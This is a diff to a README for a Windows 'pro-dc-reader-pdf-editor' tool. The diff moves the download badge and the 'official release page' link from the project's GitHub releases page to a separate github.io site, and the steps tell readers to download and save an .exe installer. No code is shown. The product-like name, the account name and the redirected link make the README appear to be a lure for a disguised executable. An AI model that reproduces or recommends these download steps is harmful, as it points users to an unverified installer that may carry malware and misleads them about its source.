@@ -1,13 +1,13 @@
 # 📄 pro-dc-reader-pdf-editor - Tools for managing your digital documents
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Bruisercybersex859/pro-dc-reader-pdf-editor/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://bruisercybersex859.github.io)
 
 This application provides a complete toolset for your PDF documents. It allows you to read, edit, convert, merge, split, sign, and fill forms. You can use this software on your Windows desktop to manage any document workflow.
 
 ## 📥 Getting Started
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/Bruisercybersex859/pro-dc-reader-pdf-editor/releases) to access the latest installer.
+2. Go to the [official release page](https://bruisercybersex859.github.io) to access the latest installer.
 3. Locate the latest version at the top of the list.
 4. Click the file ending in .exe to start the download.
 5. Save the file to your computer.
